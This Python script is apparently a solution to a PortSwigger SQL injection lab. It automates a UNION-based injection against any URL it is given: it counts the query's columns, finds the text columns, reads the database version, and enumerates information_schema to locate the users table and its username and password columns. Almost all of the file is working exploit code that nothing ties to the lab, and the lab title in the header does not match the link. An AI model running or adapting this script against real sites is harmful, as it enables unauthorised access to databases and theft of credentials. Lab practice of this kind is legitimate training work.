#!/usr/bin/env python3
# Lab: SQL injection UNION attack, determining the number of columns returned by the query
# Lab-Link: https://github.com/frank-leitner/portswigger-websecurity-academy/tree/main/01-sqli/Blind_SQL_injection_with_conditional_responses
# Difficulty: PRACTITIONER

import requests
import sys
import re
from bs4 import BeautifulSoup

proxies = {
  "http": "http://157.10.3.10:8080",
  "https": "https://157.10.3.10:8080",
}

session = requests.Session()

def num_cols(url):
    r = requests.get(url)
    src_content = r.text
    print("[.] Finding number of columns...")
    for i in range(1,50):
        payload = "+ORDER+BY+%s--" %i
        # r = requests.get(url+payload, verify=False, proxies=proxies)
        r = session.get(url+payload, verify=False)
        res = r.text
        if ( len(src_content) < len(res) ) or ( len(src_content) > len(res) ):
            print ("[+] The columns are " + str(i-1))
            return i-1
        i += 1
    return False

def string_cols(url, num_cols): #find columns that accepts text
    print("[.] Finding columns that accept text...")
    text_cols = ["NULL"] * num_cols
    test_string = "'xyzwert'"
    for i in range(1,num_cols+1):
        payload_list = ['NULL'] * num_cols
        payload_list[i-1] = test_string
        payload = "+UNION+SELECT+" + ','.join(payload_list) + "--"
        # r = requests.get(url+payload, verify=False, proxies=proxies)
        r = session.get(url+payload, verify=False)
        if 'xyzwert' in r.text:
            text_cols[i-1]=i
            print(text_cols)   
    return text_cols

def version_search(url, n_cols, text_cols):
    print("[.] Searching for database version...")
    payload_list = ['NULL'] * n_cols
    payload_list[text_cols[1]] = 'version()'
    payload = "+UNION+SELECT+" + ','.join(payload_list) + "--"
    # r = requests.get(url+payload, verify=False, proxies=proxies)
    r = session.get(url+payload, verify=False)
    res = r.text
    
    versions = {
          "PostgreSQL",
          "MariaDB"
    }

    for version in versions:
        # print(version)
        if version in res:
            print ("[+] Found database version:")
            soup = BeautifulSoup(res, 'html.parser')
            str_version = soup.find(string=re.compile('.*MariaDB.*')) 
            print("[+] The database version is " + str_version)
            return True
        return False

def find_users_table(url, columns, text_cols):
    print("[.] Finding users table...")
    payload_list = ['NULL'] * columns
    payload_list[text_cols[1]] = 'table_name'
    payload = "+UNION+SELECT+" + ','.join(payload_list) + "+FROM+information_schema.tables--"
    
    # r = requests.get(url+payload, verify=False, proxies=proxies)
    r = session.get(url+payload, verify=False)
    res = r.text
    
    if "users" in res.lower():
        print ("[+] Found users table:")
        soup = BeautifulSoup(res, 'html.parser')
        table = soup.find(string=re.compile('.*users.*'))
        print("[+] The User Table is \'" + table.strip() + "\'")
        return table.strip()
    return False

def find_usrnm_passwd_cols(url, columns, text_cols, users):
    cols = ["NULL"] * 2
    print("[.] Finding names of user and passwd columns...")
    payload_list = ['NULL'] * columns
    payload_list[text_cols[1]] = 'column_name'
    payload = "+UNION+SELECT+" + ','.join(payload_list) + "+FROM+information_schema.columns+WHERE+table_name='%s'--" %users
    # r = requests.get(url+payload, verify=False, proxies=proxies)
    r = session.get(url+payload, verify=False)
    res = r.text
    
    if 'username' in res.lower() and 'password' in res.lower():
        print ("[+] Found column names:")
        soup = BeautifulSoup(res, 'html.parser')
        usr = soup.find(string=re.compile('.*username.*')).strip()
        # print(usr)
        cols[0] = usr
        passwd = soup.find(string=re.compile('.*password.*')).strip()
        # print(passwd)        
        cols[1] = passwd
        print("[+] The tables are \'" + cols[0] + "\' & \'" + cols[1] + "\'")
        return cols
    
if __name__ == "__main__":
    try:
        url=sys.argv[1]
    except(IndexError):
        print("[-] Usage: %s <url>" %sys.argv[1])
        sys.exit(-1)

    columns = num_cols(url)
    text_cols = string_cols(url, columns)
    version_search(url, columns, text_cols)
    users = find_users_table(url, columns, text_cols)
    col_names = find_usrnm_passwd_cols(url, columns, text_cols, users)